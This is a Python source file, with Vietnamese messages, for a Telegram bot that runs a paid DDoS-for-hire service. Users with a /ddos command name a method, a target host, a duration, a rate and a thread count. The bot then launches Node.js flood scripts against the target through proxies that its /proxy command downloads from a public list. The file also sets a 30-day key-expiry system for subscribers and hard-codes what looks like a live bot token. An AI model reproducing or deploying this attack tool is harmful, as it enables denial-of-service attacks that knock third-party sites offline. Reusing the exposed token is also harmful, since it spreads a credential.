import telebot
import threading
import subprocess
import time
import psutil
from datetime import datetime, timedelta
import datetime
import sqlite3
import os
import urllib.request
import requests
bot_token = '6730086615:AAH9jcxJGY2z7DTmTGi7yhzfL74KTPvSGxI'
bot = telebot.TeleBot(bot_token)
ADMIN_ID = [6898972525, 5789810284, 6316321401]
allowed_users = ADMIN_ID
is_bot_active = True
key_dict = {}
cooldown_dict = {}
valid_keys = {}


def run_attack(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()
    while cmd_process.poll() is None:
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= duration:
                cmd_process.terminate()
                bot.reply_to(message, f"Attack DDoS Kết Thúc Sau {duration} giây.")
                return
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            bot.reply_to(message, f"Attack DDoS Kết Thúc Sau {duration} giây.")
            return


def get_thread_connection():
    return sqlite3.connect('user_data.db')
def check_thu_trong_tuan(tmr_virus_day):
    ngay_map = {
        'Monday': 'Thứ Hai',
        'Tuesday': 'Thứ Ba',
        'Wednesday': 'Thứ Tư',
        'Thursday': 'Thứ Năm',
        'Friday': 'Thứ Sáu',
        'Saturday': 'Thứ Bảy',
        'Sunday': 'Chủ Nhật'
    }
    return ngay_map.get(tmr_virus_day, tmr_virus_day)

def create_table():
    conn = get_thread_connection()
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            key TEXT,
            expiration_time TEXT
        )
    ''')
    conn.commit()
    conn.close()


create_table()


def load_users_from_database():
    conn = get_thread_connection()
    cursor = conn.cursor()
    cursor.execute('SELECT user_id, expiration_time FROM users')
    rows = cursor.fetchall()
    current_time = datetime.datetime.now()
    for row in rows:
        user_id = row[0]
        expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')

        if expiration_time > current_time:
            allowed_users.append(user_id)
    conn.close()


def save_user_to_database(user_id, key):
    new_connection = sqlite3.connect('user_data.db')
    new_cursor = new_connection.cursor()
    expiration_time = datetime.datetime.now() + datetime.timedelta(days=30)
    new_cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, key, expiration_time)
        VALUES (?, ?, ?)
    ''', (user_id, key, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
    new_connection.commit()
    new_connection.close()


load_users_from_database()


@bot.message_handler(commands=['start'])
def start(message):
    # Lấy tên và username của người gửi tin nhắn
    user_name = message.from_user.first_name
    user_username = message.from_user.username

    # Tạo câu chào với tên và username của người dùng
    greeting_message = f"Chào {user_name} (@{user_username}),\n\n" \
                       "Xin chào! Tôi là bot chat. Dưới đây là các lệnh bạn có thể sử dụng:\n\n" \
                       "/ddos - Sử dụng để khởi đầu một cuộc tấn công DDoS."

    # Gửi câu chào đến người dùng
    bot.reply_to(message, greeting_message)

@bot.message_handler(commands=['ddos'])
def attack_command(message):
    user_id = message.from_user.id
    current_datetime = datetime.datetime.now()

    tmr = check_thu_trong_tuan(current_datetime.strftime("%A"))
    current_datetime_str = current_datetime.strftime(f"{tmr}, Ngày %d/%m/%Y %H:%M:%S")
    if not is_bot_active:
        bot.reply_to(message, 'Bot đang tạm ngừng hoạt động. Vui lòng đợi để kích hoạt lại.')
        return
    if user_id not in allowed_users:
        bot.reply_to(message, 'Bạn không được phép sử dụng lệnh này.')
        return
    args = message.text.split()
    if len(args) < 6:
        bot.reply_to(message, 'Vui lòng cung cấp đủ tham số.\nVí dụ: /ddos [Phương thức] [Host] [Thời gian] [Tốc độ] [Số luồng]')
        return

    username = message.from_user.username
    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('ddos', 0) < 120:
        remaining_time = int(120 - (current_time - cooldown_dict[username].get('ddos', 0)))
        bot.reply_to(message, f"@{username} Vui lòng chờ {remaining_time} giây trước khi sử dụng lại lệnh /ddos.")
        return

    method = args[1].upper()
    host = args[2]
    duration = int(args[3])
    rate = int(args[4])
    thread = int(args[5])

    commands = []
    if method == 'AK47':
        commands = [
            ["node", "A37.js", host, str(duration), str(rate), str(thread), "GET", "proxy.txt"],
            ["node", "A38.js", host, str(duration), str(rate), str(thread), "proxy.txt"],
            ["node", "A36.js", host, str(duration), str(rate), str(thread), "GET", "proxy.txt"],
            ["node", "A38.js", host, str(duration), str(rate), str(thread), "proxy.txt"],
            ["node", "A37.js", host, str(duration), str(rate), str(thread), "GET", "proxy.txt"],
            ["node", "A36.js", host, str(duration), str(rate), str(thread), "GET", "proxy.txt"]
        ]
    elif method == 'A36':
        command = ["node", "A36.js", host, str(duration), str(rate), str(thread), "proxy.txt"]
        commands.append(command)
    elif method == 'A37':
        command = ["node", "A37.js", host, str(duration), str(rate), str(thread), "GET", "proxy.txt"]
        commands.append(command)
    elif method == 'A38':
        command = ["node", "A38.js", host, str(duration), str(rate), str(thread), "GET", "proxy.txt"]
        commands.append(command)
    else:
        bot.reply_to(message, 'Phương thức tấn công không hợp lệ. Sử dụng lệnh /methods để xem các phương thức tấn công có sẵn.')
        return

    for idx, command in enumerate(commands, start=1):
        cooldown_dict[username] = {'attack': current_time}
        attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
        attack_thread.start()
        bot.reply_to(message, f"Thành công {idx}/{len(commands)}")
    video_url = "liemspam.000webhostapp.com/lon.mp4"
    message_text =f'╔══➤𝗔𝘁𝘁𝗮𝗰𝗸 𝗗𝗱𝗼𝘀 [ {method} ] 𝗦𝘂𝗰𝗰𝗲𝘀𝘀!\n╠➤➤ 𝑼𝒔𝒆𝒓𝒏𝒂𝒎𝒆: [ @{username} ]\n╠➤➤ 𝑯𝒐𝒔𝒕:\n╠➤➤ [ {host} ]\n╠➤➤ 𝑻𝒊𝒎𝒆: [ {duration}𝘀 ]\n╠➤➤ 𝑴𝒆𝒕𝒉𝒐𝒅: [ {method} ]\n╠➤➤ 𝑨𝒕𝒕𝒂𝒄𝒌 𝑻𝒊𝒎𝒆:\n╠➤➤ [ {current_datetime_str} ]\n╠➤➤ 𝑾𝒂𝒊𝒕𝒊𝒏𝒈 𝑻𝒊𝒎𝒆: [ {duration}𝘀 ]\n╠➤➤ 𝑷𝒍𝒂𝒏: [ 𝐕𝐈𝐏 ]\n╠➤➤ 𝑾𝒐𝒓𝒌𝒔 𝑾𝒆𝒍𝒍: [ 𝐓𝐑𝐔𝐄 ]\n╚════════➤𝙏𝙃𝙀 𝙀𝙉𝘿'
    bot.send_video(message.chat.id, video_url, caption=message_text, parse_mode='html') 

@bot.message_handler(commands=['proxy'])
def get_proxy_list(message):
    current_directory = os.getcwd()
    folder_path = f"{current_directory}"
    url = "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"
    file_name = "proxy.txt"
    try:
        response = urllib.request.urlopen(url)
        data = response.read().decode('utf-8')
        file_path = os.path.join(folder_path, file_name)
        with open(file_path, 'w') as file:
            file.write(data)
        bot.reply_to(message, "Danh sách proxy đã được cập nhật thành công.")
    except Exception as e:
        bot.reply_to(message, f"Có lỗi khi cập nhật danh sách proxy: {e}")


bot.infinity_polling(timeout=60, long_polling_timeout=1)
